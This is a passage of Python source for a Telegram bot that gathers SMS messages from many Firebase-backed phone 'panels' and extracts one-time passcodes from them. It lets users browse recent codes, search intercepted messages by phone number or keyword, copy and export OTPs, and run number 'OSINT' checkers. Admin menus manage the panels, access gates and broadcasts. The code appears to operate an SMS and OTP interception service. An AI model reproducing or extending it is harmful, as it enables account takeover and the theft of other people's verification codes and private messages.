    await send_result(update, ctx, premium_text("all panels", [f"📡 total: <b>{len(tags)}</b>", "", "<i>tap to open.</i>"], icon="book"), kb_panels(tags, page), view_spec=spec)

@register_view("panel_devices")
async def view_panel_devices(update, ctx, tag, page=0):
    admin = is_admin(update.effective_chat.id)
    spec = {"kind": "panel_devices", "args": {"tag": tag, "page": page}}
    if not admin and tag in ADMIN_ONLY_TAGS:
        await send_result(update, ctx, premium_text("error", ["🚫 <b>admin only</b>"], icon="lock"), kb_back(), view_spec=spec); return
    devs = DEVICE_CACHE.get(tag, [])
    kb, total = kb_devices(devs, page, admin)
    await send_result(update, ctx, premium_text(tag, [f"📱 devices: <b>{len(devs)}</b>", f"🟢 online: <b>{sum(1 for d in devs if d.online)}</b>", "", f"<i>page {page+1}/{total}</i>"], icon="book"), kb, view_spec=spec)

@register_view("recent")
async def view_recent(update, ctx):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    spec = {"kind": "recent", "args": {}}
    devs = [d for d in merged_devices(admin) if d.numbers]
    if not devs:
        await send_result(update, ctx, premium_text("recent otps", ["📭 <i>no devices.</i>"], icon="key"), kb_back(), view_spec=spec); return
    sem = asyncio.Semaphore(20)
    async def one(d):
        async with sem:
            try:
                b = await FB.get(d.base_url, d.sms_path) or {}
                return d, b if isinstance(b, dict) else {}
            except: return d, {}
    results = await asyncio.gather(*(one(d) for d in devs))
    best = {}
    for d, bulk in results:
        for _, s in bulk.items():
            if not isinstance(s, dict): continue
            o = extract_otp(_body(s))
            if not o: continue
            lbl = d.numbers[0] if d.numbers else d.name
            try: ts = int(s.get("timestamp") or 0)
            except: ts = 0
            cur = best.get(lbl)
            if not cur or ts > cur[0]: best[lbl] = (ts, s, d, o)
    if not best:
        await send_result(update, ctx, premium_text("recent otps", ["📭 <i>none.</i>"], icon="key"), kb_back(), view_spec=spec); return
    lines = []
    for i, (lbl, (ts, s, d, o)) in enumerate(sorted(best.items(), key=lambda kv: -kv[1][0])[:20], 1):
        site, eid = detect_site(s.get("sender",""), o.context)
        lines.append(f"{i}. {em(eid,'🌐')} <b>{esc(site)}</b>\n    {pem('key','🔑')} <code>{esc(o.code)}</code> · {pem('phone','📞')} <code>{esc(mask_num(lbl, admin))}</code>\n    {pem('chart','📅')} {esc(sms_date(s))}")
        await log_user_otp(uid, lbl, s.get("sender","—"), o, d.tag)
    await send_result(update, ctx, premium_text(f"recent otps ({len(best)})", lines, icon="key"), kb_back(), view_spec=spec)

@register_view("status")
async def view_status(update, ctx):
    admin = is_admin(update.effective_chat.id)
    spec = {"kind": "status", "args": {}}
    lines, tot, on_tot, num_tot = [], 0, 0, 0
    for tag in sorted(DATABASES):
        if not admin and tag in ADMIN_ONLY_TAGS: continue
        cached = DEVICE_CACHE.get(tag, [])
        on = sum(1 for d in cached if d.online)
        nums = sum(len(d.numbers) for d in cached)
        tot += len(cached); on_tot += on; num_tot += nums
        bar = "🟢" if on else ("🔴" if cached else "⚫")
        lines.append(f"{bar} {esc(tag[:20])} — {on}/{len(cached)} · {nums} ☎")
    body = [f"📱 total: <b>{tot}</b>", f"🟢 online: <b>{on_tot}</b>", f"🔢 numbers: <b>{num_tot}</b>", ""] + lines[:30]
    await send_result(update, ctx, premium_text("panel status", body, icon="chart"), kb_back(), view_spec=spec)

@register_view("profile")
async def view_profile(update, ctx):
    uid = update.effective_chat.id
    u = all_users.get(uid) or {}
    spec = {"kind": "profile", "args": {}}
    await send_result(update, ctx, premium_text("my profile", [
        f"{pem('ghost','🆔')} id: <code>{uid}</code>",
        f"{pem('heart','👤')} name: {esc(u.get('name','—'))}",
        f"{pem('star','🔗')} username: @{esc(u.get('username') or 'none')}",
        f"{pem('chart','📅')} joined: {esc(u.get('joined_at','—'))}",
        f"{pem('check','✅')} access: <b>{'yes' if has_access(uid) else 'no'}</b>",
        f"{pem('sparkle','🎁')} referrals: <b>{referral_count(uid)}/{REQUIRED_REFERRALS}</b>",
    ], icon="ghost"), kb_back(), view_spec=spec)

@register_view("my_otps")
async def view_my_otps(update, ctx):
    uid = update.effective_chat.id
    spec = {"kind": "my_otps", "args": {}}
    hist = await db.get_otp_history(uid)
    if not hist:
        await send_result(update, ctx, premium_text("my otps", ["📭 <i>no history yet.</i>", "", "use <b>Devices</b> or <b>Search</b> to browse."], icon="key"), kb_back(), view_spec=spec); return
    lines = []
    for i, e in enumerate(hist[:30], 1):
        try: dt = datetime.fromtimestamp(e["ts"]/1000).strftime("%d %b · %I:%M %p")
        except: dt = "—"
        lines.append(f"{i}. {em(e['site_eid'],'🌐')} <b>{esc(e['site'])}</b>\n    {pem('key','🔑')} <code>{esc(e['otp'])}</code> · {pem('phone','📞')} <code>{esc(e['number'])}</code>\n    {pem('chart','📅')} {dt} · {pem('fire','🔥')} <code>{esc(e['panel'][:15])}</code>")
    kb = InlineKeyboardMarkup([
        [ibtn(sc("Export CSV"), cb="export:csv", style="success", eid=PREMIUM_EMOJIS.get("upload"))],
        [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
    ])
    await send_result(update, ctx, premium_text(f"my otps ({len(hist)})", lines + ["", f"<i>newest {len(hist[:30])} shown</i>"], icon="key"), kb, view_spec=spec)

@register_view("search")
async def view_search(update, ctx, query):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    clean = re.sub(r"\D", "", query)
    spec = {"kind": "search", "args": {"query": clean}}
    if len(clean) < 8:
        await send_result(update, ctx, premium_text("error", ["❌ <b>number too short.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    devs = merged_devices(admin)
    matches = [d for d in devs if any(clean in re.sub(r"\D", "", n) or re.sub(r"\D", "", n) in clean for n in d.numbers)]
    if not matches:
        await send_result(update, ctx, premium_text("search results", [f"📞 <code>{esc(clean)}</code>", "", "❌ <i>no match.</i>"], icon="phone"), kb_back(), view_spec=spec); return
    seen_nums = {}
    for d in matches:
        for n in d.numbers:
            cn = re.sub(r"\D", "", n)
            if clean in cn or cn in clean: seen_nums[n] = seen_nums.get(n, 0) + 1
    rows = []
    for num, count in list(seen_nums.items())[:15]:
        rows.append([ibtn(f"📞 {mask_num(num, admin)} · {count} dev", cb=f"num:otps:{re.sub(r'\\D','',num)}", style="primary")])
    rows.append([ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))])
    await send_result(update, ctx, premium_text(f"search — {clean[:15]}", [
        f"📞 query: <code>{esc(clean)}</code>",
        f"🎯 matches: <b>{len(matches)}</b>",
        f"📱 distinct numbers: <b>{len(seen_nums)}</b>", "",
        "<i>tap a number to open its otp list.</i>",
    ], icon="phone"), InlineKeyboardMarkup(rows), view_spec=spec)

@register_view("keyword")
async def view_keyword(update, ctx, kw):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    spec = {"kind": "keyword", "args": {"kw": kw}}
    kw = kw.lower().strip()
    if not kw: return
    devs = [d for d in merged_devices(admin) if d.numbers]
    sem = asyncio.Semaphore(20)
    async def one(d):
        async with sem:
            try:
                b = await FB.get(d.base_url, d.sms_path) or {}
                return d, b if isinstance(b, dict) else {}
            except: return d, {}
    results = await asyncio.gather(*(one(d) for d in devs))
    matches = []
    for d, bulk in results:
        for _, s in bulk.items():
            if not isinstance(s, dict): continue
            if kw in _body(s).lower(): matches.append((d, s)); break
    if not matches:
        await send_result(update, ctx, premium_text(f"keyword — {kw[:15]}", ["❌ <i>no matches.</i>"], icon="book"), kb_back(), view_spec=spec); return
    lines = []
    for i, (d, s) in enumerate(matches[:15], 1):
        num = d.numbers[0] if d.numbers else d.name
        o = extract_otp(_body(s))
        site, eid = detect_site(s.get("sender",""), _body(s))
        line = f"{i}. {em(eid,'🌐')} <b>{esc(site)}</b>\n    📞 <code>{esc(mask_num(num, admin))}</code>"
        if o:
            line += f" · 🔑 <code>{esc(o.code)}</code>"
            await log_user_otp(uid, num, s.get("sender","—"), o, d.tag)
        lines.append(line)
    await send_result(update, ctx, premium_text(f"keyword — {kw[:15]}", [f"🎯 matches: <b>{len(matches)}</b>", ""] + lines, icon="book"), kb_back(), view_spec=spec)

@register_view("number_otps")
async def view_number_otps(update, ctx, number):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    clean = re.sub(r"\D", "", number)
    num_norm = _norm_num(clean)
    spec = {"kind": "number_otps", "args": {"number": number}}
    if len(clean) < 6:
        await send_result(update, ctx, premium_text("error", ["❌ <b>number too short.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    devs = [d for d in merged_devices(admin) if any(clean in re.sub(r"\D", "", n) or re.sub(r"\D", "", n) in clean for n in d.numbers)]
    if not devs:
        await send_result(update, ctx, premium_text("otp site", [f"📞 <code>{esc(number)}</code>", "", "❌ <i>no devices.</i>"], icon="phone"), kb_back(), view_spec=spec); return
    sem = asyncio.Semaphore(15)
    async def _one(d):
        async with sem:
            try:
                b = await FB.get(d.base_url, d.sms_path) or {}
                return d, b if isinstance(b, dict) else {}
            except: return d, {}
    results = await asyncio.gather(*(_one(d) for d in devs))
    seen_ts = (number_seen.get(uid) or {}).get(num_norm) or int((time.time()-300)*1000)
    hits, seen_codes = [], set()
    for d, bulk in results:
        entries = [{"_k": k, **v} for k, v in bulk.items() if isinstance(v, dict)]
        entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
        for s in entries:
            o = extract_otp(_body(s))
            if not o: continue
            try: ts = int(s.get("timestamp") or 0)
            except: ts = 0
            key = (o.code, d.tag)
            if key in seen_codes: continue
            seen_codes.add(key)
            site, eid = detect_site(s.get("sender",""), o.context)
            hits.append({"code": o.code, "site": site, "eid": eid, "ts": ts, "panel": d.tag})
            await log_user_otp(uid, number, s.get("sender","—"), o, d.tag)
            if len(hits) >= 30: break
        if len(hits) >= 30: break

    if not hits:
        number_seen.setdefault(uid, {})[num_norm] = int(time.time()*1000)
        await send_result(update, ctx, premium_text("otp site", [f"📞 <code>{esc(number)}</code>", f"📱 devices: <b>{len(devs)}</b>", "", "📭 <i>no otps on this number yet.</i>"], icon="key"), InlineKeyboardMarkup([
            [ibtn(sc("Refresh"), cb=f"num:otps:{clean}", style="primary", eid=PREMIUM_EMOJIS.get("check"))],
            [ibtn(sc("Last SMS"), cb=f"num:sms:{clean}", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
            [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
        ]), view_spec=spec); return

    hits.sort(key=lambda h: -h["ts"])
    new_count = sum(1 for h in hits if h["ts"] > seen_ts)
    lines = []
    for h in hits:
        is_new = h["ts"] > seen_ts
        marker = "🟢" if is_new else "🔴"
        status = "<b>NEW</b>" if is_new else "<i>old</i>"
        try: dt = datetime.fromtimestamp(h["ts"]/1000 if h["ts"] > 1e11 else h["ts"]).strftime("%d %b · %H:%M")
        except: dt = "—"
        lines.append(f"{marker} {status}  {pem('key','🔑')} <code>{esc(h['code'])}</code>\n    {em(h['eid'],'🌐')} <b>{esc(h['site'])}</b> · {pem('chart','📅')} {dt}\n    {pem('fire','🔥')} <code>{esc(h['panel'])}</code>")
    header = [f"📞 <code>{esc(number)}</code>", f"📱 devices: <b>{len(devs)}</b> · 🔑 otps: <b>{len(hits)}</b>"]
    if new_count: header.append(f"🟢 new: <b>{new_count}</b> · 🔴 old: <b>{len(hits)-new_count}</b>")
    header.append("")

    top = hits[0]
    kb = InlineKeyboardMarkup([
        [ibtn(f"🔑 Copy {top['code']}", copy=top["code"], eid=PREMIUM_EMOJIS.get("key"), style="success")],
        [ibtn(sc("Refresh"), cb=f"num:otps:{clean}", style="primary", eid=PREMIUM_EMOJIS.get("check")), ibtn(sc("Last SMS"), cb=f"num:sms:{clean}", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
    ])
    await send_result(update, ctx, premium_text(f"otp site · {number}", header + lines, icon="key"), kb, view_spec=spec)
    number_seen.setdefault(uid, {})[num_norm] = int(time.time()*1000)

@register_view("number_sms")
async def view_number_sms(update, ctx, number):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    clean = re.sub(r"\D", "", number)
    num_norm = _norm_num(clean)
    spec = {"kind": "number_sms", "args": {"number": number}}
    devs = [d for d in merged_devices(admin) if any(clean in re.sub(r"\D", "", n) or re.sub(r"\D", "", n) in clean for n in d.numbers)]
    if not devs:
        await send_result(update, ctx, premium_text("error", ["❌ <b>no devices.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    sem = asyncio.Semaphore(15)
    async def _one(d):
        async with sem:
            try:
                b = await FB.get(d.base_url, d.sms_path) or {}
                return d, b if isinstance(b, dict) else {}
            except: return d, {}
    results = await asyncio.gather(*(_one(d) for d in devs))
    all_e = []
    for d, bulk in results:
        for _, s in bulk.items():
            if not isinstance(s, dict): continue
            try: ts = int(s.get("timestamp") or 0)
            except: ts = 0
            all_e.append((ts, d, s))
    all_e.sort(key=lambda x: -x[0])
    seen_ts = (number_seen.get(uid) or {}).get(num_norm) or int((time.time()-300)*1000)
    if not all_e:
        number_seen.setdefault(uid, {})[num_norm] = int(time.time()*1000)
        await send_result(update, ctx, premium_text("last sms", [f"📞 <code>{esc(number)}</code>", "", "📭 <i>no sms.</i>"], icon="book"), InlineKeyboardMarkup([
            [ibtn(sc("OTPs"), cb=f"num:otps:{clean}", style="success", eid=PREMIUM_EMOJIS.get("key"))],
            [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
        ]), view_spec=spec); return
    lines = []
    for i, (ts, d, s) in enumerate(all_e[:15], 1):
        marker = "🟢" if ts > seen_ts else "🔴"
        try: dt = datetime.fromtimestamp(ts/1000 if ts > 1e11 else ts).strftime("%d %b · %H:%M")
        except: dt = sms_date(s)
        o = extract_otp(_body(s))
        tag = f"{pem('key','🔑')} <code>{esc(o.code)}</code> · " if o else ""
        lines.append(f"{i}. {marker} {pem('ghost','👤')} <b>{esc(str(s.get('sender','—'))[:20])}</b>\n    {tag}{pem('chart','📅')} {dt} · {pem('fire','🔥')} <code>{esc(d.tag)}</code>\n    {pem('book','💬')} {esc(_body(s)[:120])}")
    await send_result(update, ctx, premium_text(f"last sms · {number}", [f"📞 <code>{esc(number)}</code>", f"📱 devices: <b>{len(devs)}</b> · 💬 total: <b>{len(all_e)}</b>", ""] + lines, icon="book"), InlineKeyboardMarkup([
        [ibtn(sc("OTPs"), cb=f"num:otps:{clean}", style="success", eid=PREMIUM_EMOJIS.get("key")), ibtn(sc("Refresh"), cb=f"num:sms:{clean}", style="primary", eid=PREMIUM_EMOJIS.get("check"))],
        [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
    ]), view_spec=spec)
    number_seen.setdefault(uid, {})[num_norm] = int(time.time()*1000)

# ══════════════════════════════════════════════════════════════════
# ADMIN VIEWS
# ══════════════════════════════════════════════════════════════════
@register_view("admin")
async def view_admin(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin", "args": {}}
    await send_result(update, ctx, premium_text("admin panel", [
        f"{pem('ghost','👥')} users: <b>{len(all_users)}</b>",
        f"{pem('check','✅')} allowed: <b>{len(allowed_users)}</b>",
        f"{pem('book','📡')} panels: <b>{len(DATABASES)}</b>",
        f"{pem('rocket','🤖')} clones: <b>{len(CLONES)}</b>",
        f"{pem('bell','👁')} live: <b>{'on' if LIVE_MONITOR else 'off'}</b>",
        f"{pem('backup','💾')} backup: <b>{'on' if AUTO_BACKUP_ENABLED else 'off'}</b>",
    ], icon="shield"), kb_admin_menu(), view_spec=spec)

@register_view("admin_databases")
async def view_admin_databases(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_databases", "args": {}}
    await send_result(update, ctx, premium_text("databases", [
        f"📡 total: <b>{len(DATABASES)}</b>",
        f"🔒 admin-only: <b>{len(ADMIN_ONLY_TAGS)}</b>", "",
        "<i>add active dbs keeps poll light.</i>",
        "<i>purge removes firebases with no recent activity.</i>",
    ], icon="book"), kb_admin_databases(), view_spec=spec)

@register_view("admin_users")
async def view_admin_users(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_users", "args": {}}
    banned = sum(1 for u in all_users.values() if u.get("banned"))
    await send_result(update, ctx, premium_text("users & access", [
        f"👥 total: <b>{len(all_users)}</b>",
        f"✅ allowed: <b>{len(allowed_users)}</b>",
        f"🚫 banned: <b>{banned}</b>",
        f"🔒 gate: <b>{'on' if GRANT_ACCESS_REQUIRED else 'off'}</b>",
        f"👑 admins: <b>{len(ADMIN_IDS)}</b>",
    ], icon="shield"), kb_admin_users(), view_spec=spec)

@register_view("admin_admins")
async def view_admin_admins(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_admins", "args": {}}
    lines = []
    for aid in sorted(ADMIN_IDS):
        u = all_users.get(aid) or {}
        owner_mark = " 👑" if aid == OWNER_HARD_ID else ""
        lines.append(f"• <code>{aid}</code> — {esc(u.get('name','?'))}{owner_mark}")
    if not lines: lines = ["<i>none</i>"]
    await send_result(update, ctx, premium_text(f"admins ({len(ADMIN_IDS)})", lines + ["", "<i>owner cannot be removed.</i>"], icon="shield"), kb_admin_admins(), view_spec=spec)

@register_view("admin_emojis")
async def view_admin_emojis(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_emojis", "args": {}}
    await send_result(update, ctx, text_emojis_list(), kb_admin_emojis(), view_spec=spec)

@register_view("admin_live")
async def view_admin_live(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_live", "args": {}}
    await send_result(update, ctx, text_live_status(), kb_admin_live(), view_spec=spec)

@register_view("admin_storage")
async def view_admin_storage(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_storage", "args": {}}
    await send_result(update, ctx, text_storage(), kb_admin_storage(), view_spec=spec)

@register_view("admin_media")
async def view_admin_media(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_media", "args": {}}
    await send_result(update, ctx, text_media_status(), kb_admin_media(), view_spec=spec)

@register_view("admin_texts")
async def view_admin_texts(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_texts", "args": {}}
    def _snip(t): return (t.strip()[:70] + "…") if t.strip() else "<i>default</i>"
    await send_result(update, ctx, premium_text("editable texts", [
        f"📝 welcome: {_snip(WELCOME_TEXT)}",
        f"❓ help: {_snip(HELP_TEXT)}",
        f"💬 support: {_snip(SUPPORT_TEXT)}",
        f"🛠 maintenance: {_snip(MAINTENANCE_TEXT)}", "",
        "<i>tap a button to replace its text.</i>",
        "<i>send a single <code>-</code> to reset to default.</i>",
        "<i>HTML supported: bold, italic, code, spoiler.</i>",
    ], icon="book"), kb_admin_texts(), view_spec=spec)

@register_view("admin_clones")
async def view_admin_clones(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_clones", "args": {}}
    await send_result(update, ctx, text_clone_status(), kb_admin_clones(), view_spec=spec)

@register_view("admin_broadcast")
async def view_admin_broadcast(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_broadcast", "args": {}}
    await send_result(update, ctx, premium_text("broadcast", [
        f"👥 recipients: <b>{len(all_users)}</b>", "",
        "<b>choose send style:</b>",
        "🚀 copy — forwards media as-is",
        "✨ premium — wraps text in quote+emoji",
        "🔄 forward — native forward",
        "🔕 silent — copy without notification",
    ], icon="rocket"), kb_admin_broadcast(), view_spec=spec)

@register_view("admin_fj")
async def view_admin_fj(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_fj", "args": {}}
    lines = [f"state: <b>{'on' if FORCE_JOIN_ENABLED else 'off'}</b>", f"channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>", ""]
    for ch in FORCE_JOIN_CHANNELS:
        icon = "🔒" if ch.get("type") == "private" else "📢"
        ch_lbl = ch.get("title") or ch.get("channel") or "?"
        lines.append(f"{icon} <code>{esc(str(ch_lbl)[:30])}</code>")
    lines.append("")
    lines.append("<i>private groups: bot grants access when user sends join request.</i>")
    await send_result(update, ctx, premium_text("force join", lines, icon="lock"), kb_admin_fj(), view_spec=spec)

@register_view("admin_ref")
async def view_admin_ref(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_ref", "args": {}}
    total = sum(referral_count(u) for u in all_users)
    await send_result(update, ctx, premium_text("referral gate", [
        f"state: <b>{'on' if REFERRAL_ENABLED else 'off'}</b>",
        f"required: <b>{REQUIRED_REFERRALS}</b> referrals",
        f"total referrals: <b>{total}</b>",
    ], icon="sparkle"), kb_admin_ref(), view_spec=spec)

@register_view("admin_tools")
async def view_admin_tools(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_tools", "args": {}}
    await send_result(update, ctx, premium_text("tools", [
        f"🛠 maintenance: <b>{'on' if MAINTENANCE_MODE else 'off'}</b>",
        f"🧠 seen ids: <b>{len(SEEN_IDS)}</b>",
        f"📡 dbs: <b>{len(DATABASES)}</b>",
    ], icon="rocket"), kb_admin_tools(), view_spec=spec)

@register_view("admin_tg")
async def view_admin_tg(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_tg", "args": {}}
    status = "✅ Connected" if tg_client else "❌ Disconnected"
    await send_result(update, ctx, premium_text("telegram account", [
        f"📡 status: <b>{status}</b>",
        f"🆔 API ID: <code>{TG_API_ID or '—'}</code>",
        f"🔑 API HASH: <code>{'set' if TG_API_HASH else '—'}</code>",
        "",
        "<i>used for the TG Number Checker OSINT feature.</i>",
    ], icon="ghost"), kb_admin_tg(), view_spec=spec)

@register_view("admin_limits")
async def view_admin_limits(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "admin_limits", "args": {}}
    await send_result(update, ctx, premium_text("checker limits", [
        f"📱 Telegram limit: <b>{DAILY_TG_LIMIT}</b> / day",
        f"🟢 WhatsApp limit: <b>{DAILY_WA_LIMIT}</b> / day",
        f"🔥 Firebase limit: <b>{DAILY_FB_LIMIT}</b> / day",
        "",
        "<i>control how many numbers a user can check per day.</i>",
    ], icon="chart"), kb_admin_limits(), view_spec=spec)

@register_view("dashboard")
async def view_dashboard(update, ctx):
    if not is_admin(update.effective_chat.id): return
    spec = {"kind": "dashboard", "args": {}}
    s = FB.stats
    up = int(time.time() - START_TIME)
    await send_result(update, ctx, premium_text("dashboard", [
        f"⏱ uptime: <b>{up//3600}h {(up%3600)//60}m</b>",
        f"👥 users: <b>{len(all_users)}</b>",
        f"📡 panels: <b>{len(DATABASES)}</b>",
        f"📱 devices: <b>{sum(len(v) for v in DEVICE_CACHE.values())}</b>",
        f"🧠 seen ids: <b>{len(SEEN_IDS)}</b>",
        f"🤖 clones: <b>{len(CLONE_APPS)}</b>",
        "", f"🌐 fb req: <b>{s['requests']}</b>",
        f"🎯 cache hit: <b>{s['hit_pct']}%</b>",
    ], icon="chart"), kb_back(), view_spec=spec)

# ══════════════════════════════════════════════════════════════════
# ON_TEXT
# ══════════════════════════════════════════════════════════════════
async def on_text(update, ctx):
    chat = update.effective_chat
    if chat is None or update.message is None: return
    uid = chat.id
    text = (update.message.text or "").strip()
    admin = is_admin(uid)

    if all_users.get(uid, {}).get("banned"): return
    if not admin and MAINTENANCE_MODE:
        await reply(update, ctx, premium_text("maintenance mode", ["🛠"], icon="lock")); return

    await delete_welcome(update, ctx)

    pending = pending_action.pop(uid, None)
    if pending:
        try:
            if await handle_pending(update, ctx, pending, text, admin): return
        except Exception as e:
            log.exception(f"pending: {e}")
            await reply(update, ctx, premium_text("error", [f"❌ <code>{esc(e)}</code>"], icon="cross")); return

    if not has_access(uid) and not admin:
        await reply(update, ctx, premium_text("access required", ["🚫"], icon="lock")); return

    if text == sc("TG Checker"):
        count = await db.get_check_count(uid, "tg")
        if count >= DAILY_TG_LIMIT and not admin:
            await reply(update, ctx, premium_text("limit reached", [
                f"❌ you have reached your daily limit of <b>{DAILY_TG_LIMIT}</b> checks.",
                "", "<i>please try again tomorrow.</i>",
            ], icon="cross"), kb_main(admin)); return
        pending_action[uid] = {"action": "check_tg"}
        await reply(update, ctx, premium_text("tg checker", [
            f"📱 <b>send numbers to check (one per line):</b>",
            f"<i>remaining today: {DAILY_TG_LIMIT - count}</i>",
            f"<i>format: +919876543210</i>"
        ], icon="ghost")); return

    if text == sc("WA Checker"):
        count = await db.get_check_count(uid, "wa")
        if count >= DAILY_WA_LIMIT and not admin:
            await reply(update, ctx, premium_text("limit reached", [
                f"❌ you have reached your daily limit of <b>{DAILY_WA_LIMIT}</b> checks.",
                "", "<i>please try again tomorrow.</i>",
            ], icon="cross"), kb_main(admin)); return
        pending_action[uid] = {"action": "check_wa"}
        await reply(update, ctx, premium_text("wa checker", [
            f"📱 <b>send numbers to check (one per line):</b>",
            f"<i>remaining today: {DAILY_WA_LIMIT - count}</i>",
            f"<i>format: +919876543210</i>"
        ], icon="ghost")); return

    if text == sc("FB OSINT"):
        count = await db.get_check_count(uid, "fb")
        if count >= DAILY_FB_LIMIT and not admin:
            await reply(update, ctx, premium_text("limit reached", [
                f"❌ you have reached your daily limit of <b>{DAILY_FB_LIMIT}</b> checks.",
                "", "<i>please try again tomorrow.</i>",
            ], icon="cross"), kb_main(admin)); return
        pending_action[uid] = {"action": "check_fb"}
        await reply(update, ctx, premium_text("fb osint", [
            f"🔥 <b>send your firebase URL:</b>",
            f"<i>remaining today: {DAILY_FB_LIMIT - count}</i>",
            f"<i>format: https://xxx.firebaseio.com</i>"
        ], icon="fire")); return

    if text == sc("Main Menu"):
        view_stack.pop(uid, None)
        await reply(update, ctx, premium_text("main menu", ["<i>use the keyboard below.</i>"], icon="star"), kb_main(admin)); return
    if text == sc("Devices List") or text == sc("Refresh"):
        await view_devices(update, ctx, 0); return
    if text == sc("All Panels"):
        await view_panels(update, ctx, 0); return
    if text == sc("Search Number"):
        pending_action[uid] = {"action": "search_number"}
        await reply(update, ctx, premium_text("search", ["🔍 <b>send number to search:</b>"], icon="phone")); return
    if text == sc("Keyword Search"):
        pending_action[uid] = {"action": "search_keyword"}
        await reply(update, ctx, premium_text("search", ["🔑 <b>send keyword to search:</b>"], icon="book")); return
    if text == sc("Recent OTPs"):
        await view_recent(update, ctx); return
    if text == sc("Panel Status"):
        await view_status(update, ctx); return
    if text == sc("User Hub"):
        await reply(update, ctx, premium_text("user hub", [f"🆔 id: <code>{uid}</code>", "", "<i>options below</i>"], icon="heart"), kb_user_hub()); return
    if text == sc("My Profile"):
        await view_profile(update, ctx); return
    if text == sc("My OTPs"):
        await view_my_otps(update, ctx); return
    if text == sc("My Referrals"):
        me = await ctx.bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{uid}"
        await reply(update, ctx, premium_text("my referrals", [
            f"🎁 qualified: <b>{referral_count(uid)}/{REQUIRED_REFERRALS}</b>", "", "🔗 link:", f"<code>{esc(link)}</code>",
        ], icon="sparkle"), kb_user_hub()); return
    if text == sc("Support"):
        body = SUPPORT_TEXT.strip() or premium_text("support", [f"👤 owner: <b>{esc(OWNER_DISPLAY)}</b>", f"💬 contact: {esc(OWNER_CONTACT)}"], icon="heart")
        await reply(update, ctx, body, kb_user_hub()); return
    if text == sc("Help"):
        body = HELP_TEXT.strip() or premium_text("help", [
            "📡 <b>devices</b> — browse live panels",
            "🔍 <b>search</b> — find by number or keyword",
            "🔑 <b>recent otps</b> — latest codes",
            "👤 <b>user hub</b> — profile, otps, referrals",
        ], icon="book")
        await reply(update, ctx, body, kb_user_hub()); return
    if text == sc("Ping"):
        await reply(update, ctx, premium_text("pong", [
            f"🤖 bot: @{esc(BOT_USERNAME.lstrip('@'))}",
            f"📡 panels: <b>{len(DATABASES)}</b>",
            f"⏱ uptime: <b>{int(time.time()-START_TIME)}s</b>",
        ], icon="check")); return
    if text == sc("Admin Panel") and admin:
        await view_admin(update, ctx); return

    await reply(update, ctx, premium_text("unknown", ["❓ <i>send /start.</i>"], icon="cross"), kb_main(admin))

# ══════════════════════════════════════════════════════════════════
# PENDING HANDLER
# ══════════════════════════════════════════════════════════════════
async def handle_pending(update, ctx, act, text, admin):
    a = act.get("action", "")
    uid = update.effective_chat.id

    if a == "search_number":
        await view_search(update, ctx, text); return True
    if a == "search_keyword":
        await view_keyword(update, ctx, text); return True

    if a == "check_tg":
        numbers = [n.strip() for n in text.split("\n") if n.strip()]
        if not numbers:
            await reply(update, ctx, premium_text("error", ["❌ no numbers found."], icon="cross")); return True
            
        count = await db.get_check_count(uid, "tg")
        remaining = DAILY_TG_LIMIT - count
        if len(numbers) > remaining and not admin:
            await reply(update, ctx, premium_text("limit", [f"❌ you can only check {remaining} more numbers today."], icon="cross"), kb_main(admin)); return True
            
        if len(numbers) > 50: numbers = numbers[:50] # prevent ban
            
        msg = await reply(update, ctx, premium_text("checking", [f"⏳ <b>checking {len(numbers)} numbers...</b>"], icon="chart"))
        res = await check_tg_numbers(numbers)
        
        if not admin: await db.increment_check_count(uid, "tg", len(numbers))
        
        try: await msg.delete()
        except: pass
        await reply(update, ctx, premium_text("tg checker results", [res], icon="ghost"), kb_main(admin))
        return True

    if a == "check_wa":
        numbers = [n.strip() for n in text.split("\n") if n.strip()]
        if not numbers:
            await reply(update, ctx, premium_text("error", ["❌ no numbers found."], icon="cross")); return True
            
        count = await db.get_check_count(uid, "wa")
        remaining = DAILY_WA_LIMIT - count
        if len(numbers) > remaining and not admin:
            await reply(update, ctx, premium_text("limit", [f"❌ you can only check {remaining} more numbers today."], icon="cross"), kb_main(admin)); return True
            
        if len(numbers) > 10: numbers = numbers[:10] # max 10 for WA to prevent resource exhaustion
        
